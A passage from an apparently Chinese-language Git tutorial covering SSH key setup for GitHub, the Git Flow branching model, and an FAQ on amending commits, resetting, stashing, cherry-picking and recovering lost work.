<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/schacon/.ssh/id_rsa):</span><br><span class="line">Created directory <span class="string">'/home/schacon/.ssh'</span>.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/schacon/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/schacon/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">d0:82:24:8e:d7:f1:bb:9b:33:53:96:93:49:da:9b:e3 schacon@mylaptop.local</span><br></pre></td></tr></table></figure>

<p>首先 <code>ssh-keygen</code> 会确认密钥的存储位置（默认是 <code>.ssh/id_rsa</code>），然后它会要求你输入两次密钥口令。如果你不想在使用密钥时输入口令，将其留空即可。</p>
<p>现在，进行了上述操作的用户需要将各自的公钥发送给任意一个 Git 服务器管理员（假设服务器正在使用基于公钥的 SSH 验证设置）。 他们所要做的就是复制各自的 <code>.pub</code> 文件内容，并将其通过邮件发送。 公钥看起来是这样的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cat ~/.ssh/id_rsa.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAklOUpkDHrfHY17SbrmTIpNLTGK9Tjom/BWDSU</span><br><span class="line">GPl+nafzlHDTYW7hdI4yZ5ew18JH4JW9jbhUFrviQzM7xlELEVf4h9lFX5QVkbPppSwg0cda3</span><br><span class="line">Pbv7kOdJ/MTyBlWXFCR+HAo3FXRitBqxiX1nKhXpHAZsMciLq8V6RjsNAQwdsdMFvSlVK/7XA</span><br><span class="line">t3FaoJoAsncM1Q9x5+3V0Ww68/eIFmb1zuUFljQJKprrX88XypNDvjYNby6vw/Pb0rwert/En</span><br><span class="line">mZ+AW4OZPnTPI89ZPmVMLuayrD2cE86Z/il8b+gw3r3+1nKatmIkjn2so1d01QraTlMqVSsbx</span><br><span class="line">NrRFi9wrf+M7Q== schacon@mylaptop.local</span><br></pre></td></tr></table></figure>

<p>在你的 Github 账户中，依次点击 <strong>Settings</strong> &gt; <strong>SSH and GPG keys</strong> &gt; <strong>New SSH key</strong></p>
<p>然后，将上面生成的公钥内容粘贴到 <code>Key</code> 编辑框并保存。至此大功告成。</p>
<p>后面，你在克隆你的 Github 项目时使用 SSH 方式即可。</p>
<p>如果觉得我的讲解还不够细致，可以参考：<a href="https://help.github.com/articles/adding-a-new-ssh-key-to-your-github-account/" target="_blank" rel="noopener">https://help.github.com/articles/adding-a-new-ssh-key-to-your-github-account/</a></p>
<h2 id="最佳实践-Git-Flow"><a href="#最佳实践-Git-Flow" class="headerlink" title="最佳实践 Git Flow"></a>最佳实践 Git Flow</h2><blockquote>
<p>详细内容，可以参考这篇文章：<a href="http://www.cnblogs.com/cnblogsfans/p/5075073.html" target="_blank" rel="noopener">Git 在团队中的最佳实践–如何正确使用 Git Flow</a></p>
</blockquote>
<p>Git 在实际开发中的最佳实践策略 Git Flow 可以归纳为以下：</p>
<ul>
<li><strong><code>master</code> 分支</strong> - 也就是我们经常使用的主线分支，这个分支是最近发布到生产环境的代码，这个分支只能从其他分支合并，不能在这个分支直接修改。</li>
<li><strong><code>develop</code> 分支</strong> - 这个分支是我们的主开发分支，包含所有要发布到下一个 release 的代码，这个分支主要是从其他分支合并代码过来，比如 feature 分支。</li>
<li><strong><code>feature</code> 分支</strong> - 这个分支主要是用来开发一个新的功能，一旦开发完成，我们合并回 develop 分支进入下一个 release。</li>
<li><strong><code>release</code> 分支</strong> - 当你需要一个发布一个新 release 的时候，我们基于 Develop 分支创建一个 release 分支，完成 release 后，我们合并到 master 和 develop 分支。</li>
<li><strong><code>hotfix</code> 分支</strong> - 当我们在 master 发现新的 Bug 时候，我们需要创建一个 hotfix, 完成 hotfix 后，我们合并回 master 和 develop 分支，所以 hotfix 的改动会进入下一个 release。</li>
</ul>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="编辑提交-editting-commits"><a href="#编辑提交-editting-commits" class="headerlink" title="编辑提交(editting commits)"></a>编辑提交(editting commits)</h3><h4 id="我刚才提交了什么"><a href="#我刚才提交了什么" class="headerlink" title="我刚才提交了什么"></a>我刚才提交了什么</h4><p>如果你用 <code>git commit -a</code> 提交了一次变化(changes)，而你又不确定到底这次提交了哪些内容。 你就可以用下面的命令显示当前<code>HEAD</code>上的最近一次的提交(commit):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git show</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> -n1 -p</span><br></pre></td></tr></table></figure>

<h4 id="我的提交信息-commit-message-写错了"><a href="#我的提交信息-commit-message-写错了" class="headerlink" title="我的提交信息(commit message)写错了"></a>我的提交信息(commit message)写错了</h4><p>如果你的提交信息(commit message)写错了且这次提交(commit)还没有推(push), 你可以通过下面的方法来修改提交信息(commit message):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git commit --amend</span><br></pre></td></tr></table></figure>

<p>这会打开你的默认编辑器, 在这里你可以编辑信息. 另一方面, 你也可以用一条命令一次完成:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git commit --amend -m <span class="string">'xxxxxxx'</span></span><br></pre></td></tr></table></figure>

<p>如果你已经推(push)了这次提交(commit), 你可以修改这次提交(commit)然后强推(force push), 但是不推荐这么做。</p>
<h4 id="我提交-commit-里的用户名和邮箱不对"><a href="#我提交-commit-里的用户名和邮箱不对" class="headerlink" title="我提交(commit)里的用户名和邮箱不对"></a>我提交(commit)里的用户名和邮箱不对</h4><p>如果这只是单个提交(commit)，修改它：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git commit --amend --author <span class="string">"New Authorname &lt;authoremail@mydomain.com&gt;"</span></span><br></pre></td></tr></table></figure>

<p>如果你需要修改所有历史, 参考 ‘git filter-branch’的指南页.</p>
<h4 id="我想从一个提交-commit-里移除一个文件"><a href="#我想从一个提交-commit-里移除一个文件" class="headerlink" title="我想从一个提交(commit)里移除一个文件"></a>我想从一个提交(commit)里移除一个文件</h4><p>通过下面的方法，从一个提交(commit)里移除一个文件:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout HEAD^ myfile</span><br><span class="line">$ git add -A</span><br><span class="line">$ git commit --amend</span><br></pre></td></tr></table></figure>

<p>这将非常有用，当你有一个开放的补丁(open patch)，你往上面提交了一个不必要的文件，你需要强推(force push)去更新这个远程补丁。</p>
<h4 id="我想删除我的的最后一次提交-commit"><a href="#我想删除我的的最后一次提交-commit" class="headerlink" title="我想删除我的的最后一次提交(commit)"></a>我想删除我的的最后一次提交(commit)</h4><p>如果你需要删除推了的提交(pushed commits)，你可以使用下面的方法。可是，这会不可逆的改变你的历史，也会搞乱那些已经从该仓库拉取(pulled)了的人的历史。简而言之，如果你不是很确定，千万不要这么做。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git reset HEAD^ --hard</span><br><span class="line">$ git push -f [remote] [branch]</span><br></pre></td></tr></table></figure>

<p>如果你还没有推到远程, 把 Git 重置(reset)到你最后一次提交前的状态就可以了(同时保存暂存的变化):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch*)$ git reset --soft HEAD@&#123;1&#125;</span><br></pre></td></tr></table></figure>

<p>这只能在没有推送之前有用. 如果你已经推了, 唯一安全能做的是 <code>git revert SHAofBadCommit</code>， 那会创建一个新的提交(commit)用于撤消前一个提交的所有变化(changes)； 或者, 如果你推的这个分支是 rebase-safe 的 (例如： 其它开发者不会从这个分支拉), 只需要使用 <code>git push -f</code>； 更多, 请参考 <a href="#deleteremove-last-pushed-commit">the above section</a>。</p>
<h4 id="删除任意提交-commit"><a href="#删除任意提交-commit" class="headerlink" title="删除任意提交(commit)"></a>删除任意提交(commit)</h4><p>同样的警告：不到万不得已的时候不要这么做.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git rebase --onto SHA1_OF_BAD_COMMIT^ SHA1_OF_BAD_COMMIT</span><br><span class="line">$ git push -f [remote] [branch]</span><br></pre></td></tr></table></figure>

<p>或者做一个 <a href="#interactive-rebase">交互式 rebase</a> 删除那些你想要删除的提交(commit)里所对应的行。</p>
<h4 id="我尝试推一个修正后的提交-amended-commit-到远程，但是报错："><a href="#我尝试推一个修正后的提交-amended-commit-到远程，但是报错：" class="headerlink" title="我尝试推一个修正后的提交(amended commit)到远程，但是报错："></a>我尝试推一个修正后的提交(amended commit)到远程，但是报错：</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">To https://github.com/yourusername/repo.git</span><br><span class="line">! [rejected]        mybranch -&gt; mybranch (non-fast-forward)</span><br><span class="line">error: failed to push some refs to <span class="string">'https://github.com/tanay1337/webmaker.org.git'</span></span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: <span class="string">'git pull ...'</span>) before pushing again.</span><br><span class="line">hint: See the <span class="string">'Note about fast-forwards'</span> <span class="keyword">in</span> <span class="string">'git push --help'</span> <span class="keyword">for</span> details.</span><br></pre></td></tr></table></figure>

<p>注意, rebasing(见下面)和修正(amending)会用一个<strong>新的提交(commit)代替旧的</strong>, 所以如果之前你已经往远程仓库上推过一次修正前的提交(commit)，那你现在就必须强推(force push) (<code>-f</code>)。 注意 &ndash; <em>总是</em> 确保你指明一个分支!</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git push origin mybranch -f</span><br></pre></td></tr></table></figure>

<p>一般来说, <strong>要避免强推</strong>. 最好是创建和推(push)一个新的提交(commit)，而不是强推一个修正后的提交。后者会使那些与该分支或该分支的子分支工作的开发者，在源历史中产生冲突。</p>
<h4 id="我意外的做了一次硬重置-hard-reset-，我想找回我的内容"><a href="#我意外的做了一次硬重置-hard-reset-，我想找回我的内容" class="headerlink" title="我意外的做了一次硬重置(hard reset)，我想找回我的内容"></a>我意外的做了一次硬重置(hard reset)，我想找回我的内容</h4><p>如果你意外的做了 <code>git reset --hard</code>, 你通常能找回你的提交(commit), 因为 Git 对每件事都会有日志，且都会保存几天。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git reflog</span><br></pre></td></tr></table></figure>

<p>你将会看到一个你过去提交(commit)的列表, 和一个重置的提交。 选择你想要回到的提交(commit)的 SHA，再重置一次:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git reset --hard SHA1234</span><br></pre></td></tr></table></figure>

<p>这样就完成了。</p>
<h3 id="暂存-Staging"><a href="#暂存-Staging" class="headerlink" title="暂存(Staging)"></a>暂存(Staging)</h3><h4 id="我需要把暂存的内容添加到上一次的提交-commit"><a href="#我需要把暂存的内容添加到上一次的提交-commit" class="headerlink" title="我需要把暂存的内容添加到上一次的提交(commit)"></a>我需要把暂存的内容添加到上一次的提交(commit)</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch*)$ git commit --amend</span><br></pre></td></tr></table></figure>

<h4 id="我想要暂存一个新文件的一部分，而不是这个文件的全部"><a href="#我想要暂存一个新文件的一部分，而不是这个文件的全部" class="headerlink" title="我想要暂存一个新文件的一部分，而不是这个文件的全部"></a>我想要暂存一个新文件的一部分，而不是这个文件的全部</h4><p>一般来说, 如果你想暂存一个文件的一部分, 你可这样做:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add --patch filename.x</span><br></pre></td></tr></table></figure>

<p><code>-p</code> 简写。这会打开交互模式， 你将能够用 <code>s</code> 选项来分隔提交(commit)； 然而, 如果这个文件是新的, 会没有这个选择， 添加一个新文件时, 这样做:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add -N filename.x</span><br></pre></td></tr></table></figure>

<p>然后, 你需要用 <code>e</code> 选项来手动选择需要添加的行，执行 <code>git diff --cached</code> 将会显示哪些行暂存了哪些行只是保存在本地了。</p>
<h4 id="我想把在一个文件里的变化-changes-加到两个提交-commit-里"><a href="#我想把在一个文件里的变化-changes-加到两个提交-commit-里" class="headerlink" title="我想把在一个文件里的变化(changes)加到两个提交(commit)里"></a>我想把在一个文件里的变化(changes)加到两个提交(commit)里</h4><p><code>git add</code> 会把整个文件加入到一个提交. <code>git add -p</code> 允许交互式的选择你想要提交的部分.</p>
<h4 id="我想把暂存的内容变成未暂存，把未暂存的内容暂存起来"><a href="#我想把暂存的内容变成未暂存，把未暂存的内容暂存起来" class="headerlink" title="我想把暂存的内容变成未暂存，把未暂存的内容暂存起来"></a>我想把暂存的内容变成未暂存，把未暂存的内容暂存起来</h4><p>这个有点困难， 我能想到的最好的方法是先 stash 未暂存的内容， 然后重置(reset)，再 pop 第一步 stashed 的内容, 最后再 add 它们。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git stash -k</span><br><span class="line">$ git reset --hard</span><br><span class="line">$ git stash pop</span><br><span class="line">$ git add -A</span><br></pre></td></tr></table></figure>

<h3 id="未暂存-Unstaged-的内容"><a href="#未暂存-Unstaged-的内容" class="headerlink" title="未暂存(Unstaged)的内容"></a>未暂存(Unstaged)的内容</h3><h4 id="我想把未暂存的内容移动到一个新分支"><a href="#我想把未暂存的内容移动到一个新分支" class="headerlink" title="我想把未暂存的内容移动到一个新分支"></a>我想把未暂存的内容移动到一个新分支</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b my-branch</span><br></pre></td></tr></table></figure>

<h4 id="我想把未暂存的内容移动到另一个已存在的分支"><a href="#我想把未暂存的内容移动到另一个已存在的分支" class="headerlink" title="我想把未暂存的内容移动到另一个已存在的分支"></a>我想把未暂存的内容移动到另一个已存在的分支</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git stash</span><br><span class="line">$ git checkout my-branch</span><br><span class="line">$ git stash pop</span><br></pre></td></tr></table></figure>

<h4 id="我想丢弃本地未提交的变化-uncommitted-changes"><a href="#我想丢弃本地未提交的变化-uncommitted-changes" class="headerlink" title="我想丢弃本地未提交的变化(uncommitted changes)"></a>我想丢弃本地未提交的变化(uncommitted changes)</h4><p>如果你只是想重置源(origin)和你本地(local)之间的一些提交(commit)，你可以：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## one commit</span></span><br><span class="line">(my-branch)$ git reset --hard HEAD^</span><br><span class="line"><span class="comment">## two commits</span></span><br><span class="line">(my-branch)$ git reset --hard HEAD^^</span><br><span class="line"><span class="comment">## four commits</span></span><br><span class="line">(my-branch)$ git reset --hard HEAD~4</span><br><span class="line"><span class="comment">## or</span></span><br><span class="line">(master)$ git checkout -f</span><br></pre></td></tr></table></figure>

<p>重置某个特殊的文件, 你可以用文件名做为参数:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git reset filename</span><br></pre></td></tr></table></figure>

<h4 id="我想丢弃某些未暂存的内容"><a href="#我想丢弃某些未暂存的内容" class="headerlink" title="我想丢弃某些未暂存的内容"></a>我想丢弃某些未暂存的内容</h4><p>如果你想丢弃工作拷贝中的一部分内容，而不是全部。</p>
<p>签出(checkout)不需要的内容，保留需要的。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -p</span><br><span class="line"><span class="comment">## Answer y to all of the snippets you want to drop</span></span><br></pre></td></tr></table></figure>

<p>另外一个方法是使用 <code>stash</code>， Stash 所有要保留下的内容, 重置工作拷贝, 重新应用保留的部分。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git stash -p</span><br><span class="line"><span class="comment">## Select all of the snippets you want to save</span></span><br><span class="line">$ git reset --hard</span><br><span class="line">$ git stash pop</span><br></pre></td></tr></table></figure>

<p>或者, stash 你不需要的部分, 然后 stash drop。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git stash -p</span><br><span class="line"><span class="comment">## Select all of the snippets you don't want to save</span></span><br><span class="line">$ git stash drop</span><br></pre></td></tr></table></figure>

<h3 id="分支-Branches"><a href="#分支-Branches" class="headerlink" title="分支(Branches)"></a>分支(Branches)</h3><h4 id="我从错误的分支拉取了内容，或把内容拉取到了错误的分支"><a href="#我从错误的分支拉取了内容，或把内容拉取到了错误的分支" class="headerlink" title="我从错误的分支拉取了内容，或把内容拉取到了错误的分支"></a>我从错误的分支拉取了内容，或把内容拉取到了错误的分支</h4><p>这是另外一种使用 <code>git reflog</code> 情况，找到在这次错误拉(pull) 之前 HEAD 的指向。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git reflog</span><br><span class="line">ab7555f HEAD@&#123;0&#125;: pull origin wrong-branch: Fast-forward</span><br><span class="line">c5bc55a HEAD@&#123;1&#125;: checkout: checkout message goes here</span><br></pre></td></tr></table></figure>

<p>重置分支到你所需的提交(desired commit):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard c5bc55a</span><br></pre></td></tr></table></figure>

<p>完成。</p>
<h4 id="我想扔掉本地的提交-commit-，以便我的分支与远程的保持一致"><a href="#我想扔掉本地的提交-commit-，以便我的分支与远程的保持一致" class="headerlink" title="我想扔掉本地的提交(commit)，以便我的分支与远程的保持一致"></a>我想扔掉本地的提交(commit)，以便我的分支与远程的保持一致</h4><p>先确认你没有推(push)你的内容到远程。</p>
<p><code>git status</code> 会显示你领先(ahead)源(origin)多少个提交:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git status</span><br><span class="line"><span class="comment">## On branch my-branch</span></span><br><span class="line"><span class="comment">## Your branch is ahead of 'origin/my-branch' by 2 commits.</span></span><br><span class="line"><span class="comment">##   (use "git push" to publish your local commits)</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>一种方法是:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git reset --hard origin/my-branch</span><br></pre></td></tr></table></figure>

<h4 id="我需要提交到一个新分支，但错误的提交到了-master"><a href="#我需要提交到一个新分支，但错误的提交到了-master" class="headerlink" title="我需要提交到一个新分支，但错误的提交到了 master"></a>我需要提交到一个新分支，但错误的提交到了 master</h4><p>在 master 下创建一个新分支，不切换到新分支,仍在 master 下:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git branch my-branch</span><br></pre></td></tr></table></figure>

<p>把 master 分支重置到前一个提交:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git reset --hard HEAD^</span><br></pre></td></tr></table></figure>

<p><code>HEAD^</code> 是 <code>HEAD^1</code> 的简写，你可以通过指定要设置的<code>HEAD</code>来进一步重置。</p>
<p>或者, 如果你不想使用 <code>HEAD^</code>, 找到你想重置到的提交(commit)的 hash(<code>git log</code> 能够完成)， 然后重置到这个 hash。 使用<code>git push</code> 同步内容到远程。</p>
<p>例如, master 分支想重置到的提交的 hash 为<code>a13b85e</code>:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git reset --hard a13b85e</span><br><span class="line">HEAD is now at a13b85e</span><br></pre></td></tr></table></figure>

<p>签出(checkout)刚才新建的分支继续工作:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git checkout my-branch</span><br></pre></td></tr></table></figure>

<h4 id="我想保留来自另外一个-ref-ish-的整个文件"><a href="#我想保留来自另外一个-ref-ish-的整个文件" class="headerlink" title="我想保留来自另外一个 ref-ish 的整个文件"></a>我想保留来自另外一个 ref-ish 的整个文件</h4><p>假设你正在做一个原型方案(原文为 working spike (see note)), 有成百的内容，每个都工作得很好。现在, 你提交到了一个分支，保存工作内容:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(solution)$ git add -A &amp;&amp; git commit -m <span class="string">"Adding all changes from this spike into one big commit."</span></span><br></pre></td></tr></table></figure>

<p>当你想要把它放到一个分支里 (可能是<code>feature</code>, 或者 <code>develop</code>), 你关心是保持整个文件的完整，你想要一个大的提交分隔成比较小。</p>
<p>假设你有:</p>
<ul>
<li>分支 <code>solution</code>, 拥有原型方案， 领先 <code>develop</code> 分支。</li>
<li>分支 <code>develop</code>, 在这里你应用原型方案的一些内容。</li>
</ul>
<p>我去可以通过把内容拿到你的分支里，来解决这个问题:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(develop)$ git checkout solution -- file1.txt</span><br></pre></td></tr></table></figure>

<p>这会把这个文件内容从分支 <code>solution</code> 拿到分支 <code>develop</code> 里来:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## On branch develop</span></span><br><span class="line"><span class="comment">## Your branch is up-to-date with 'origin/develop'.</span></span><br><span class="line"><span class="comment">## Changes to be committed:</span></span><br><span class="line"><span class="comment">##  (use "git reset HEAD &lt;file&gt;..." to unstage)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">##        modified:   file1.txt</span></span><br></pre></td></tr></table></figure>

<p>然后, 正常提交。</p>
<p>Note: Spike solutions are made to analyze or solve the problem. These solutions are used for estimation and discarded once everyone gets clear visualization of the problem. ~ <a href="https://en.wikipedia.org/wiki/Extreme_programming_practices" target="_blank" rel="noopener">Wikipedia</a>.</p>
<h4 id="我把几个提交-commit-提交到了同一个分支，而这些提交应该分布在不同的分支里"><a href="#我把几个提交-commit-提交到了同一个分支，而这些提交应该分布在不同的分支里" class="headerlink" title="我把几个提交(commit)提交到了同一个分支，而这些提交应该分布在不同的分支里"></a>我把几个提交(commit)提交到了同一个分支，而这些提交应该分布在不同的分支里</h4><p>假设你有一个<code>master</code>分支， 执行<code>git log</code>, 你看到你做过两次提交:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">commit e3851e817c451cc36f2e6f3049db528415e3c114</span><br><span class="line">Author: Alex Lee &lt;alexlee@example.com&gt;</span><br><span class="line">Date:   Tue Jul 22 15:39:27 2014 -0400</span><br><span class="line"></span><br><span class="line">    Bug <span class="comment">#21 - Added CSRF protection</span></span><br><span class="line"></span><br><span class="line">commit 5ea51731d150f7ddc4a365437931cd8be3bf3131</span><br><span class="line">Author: Alex Lee &lt;alexlee@example.com&gt;</span><br><span class="line">Date:   Tue Jul 22 15:39:12 2014 -0400</span><br><span class="line"></span><br><span class="line">    Bug <span class="comment">#14 - Fixed spacing on title</span></span><br><span class="line"></span><br><span class="line">commit a13b85e984171c6e2a1729bb061994525f626d14</span><br><span class="line">Author: Aki Rose &lt;akirose@example.com&gt;</span><br><span class="line">Date:   Tue Jul 21 01:12:48 2014 -0400</span><br><span class="line"></span><br><span class="line">    First commit</span><br></pre></td></tr></table></figure>

<p>让我们用提交 hash(commit hash)标记 bug (<code>e3851e8</code> for #21, <code>5ea5173</code> for #14).</p>
<p>首先, 我们把<code>master</code>分支重置到正确的提交(<code>a13b85e</code>):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git reset --hard a13b85e</span><br><span class="line">HEAD is now at a13b85e</span><br></pre></td></tr></table></figure>

<p>现在, 我们对 bug #21 创建一个新的分支:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git checkout -b 21</span><br><span class="line">(21)$</span><br></pre></td></tr></table></figure>

<p>接着, 我们用 <em>cherry-pick</em> 把对 bug #21 的提交放入当前分支。 这意味着我们将应用(apply)这个提交(commit)，仅仅这一个提交(commit)，直接在 HEAD 上面。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(21)$ git cherry-pick e3851e8</span><br></pre></td></tr></table></figure>

<p>这时候, 这里可能会产生冲突， 参见<a href="#interactive-rebase">交互式 rebasing 章</a> <a href="#merge-conflict"><strong>冲突节</strong></a> 解决冲突.</p>
<p>再者， 我们为 bug #14 创建一个新的分支, 也基于<code>master</code>分支</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(21)$ git checkout master</span><br><span class="line">(master)$ git checkout -b 14</span><br><span class="line">(14)$</span><br></pre></td></tr></table></figure>

<p>最后, 为 bug #14 执行 <code>cherry-pick</code>:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(14)$ git cherry-pick 5ea5173</span><br></pre></td></tr></table></figure>

<h4 id="我想删除上游-upstream-分支被删除了的本地分支"><a href="#我想删除上游-upstream-分支被删除了的本地分支" class="headerlink" title="我想删除上游(upstream)分支被删除了的本地分支"></a>我想删除上游(upstream)分支被删除了的本地分支</h4><p>一旦你在 github 上面合并(merge)了一个 pull request, 你就可以删除你 fork 里被合并的分支。 如果你不准备继续在这个分支里工作, 删除这个分支的本地拷贝会更干净，使你不会陷入工作分支和一堆陈旧分支的混乱之中。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch -p</span><br></pre></td></tr></table></figure>

<h4 id="我不小心删除了我的分支"><a href="#我不小心删除了我的分支" class="headerlink" title="我不小心删除了我的分支"></a>我不小心删除了我的分支</h4><p>如果你定期推送到远程, 多数情况下应该是安全的，但有些时候还是可能删除了还没有推到远程的分支。 让我们先创建一个分支和一个新的文件:</p>
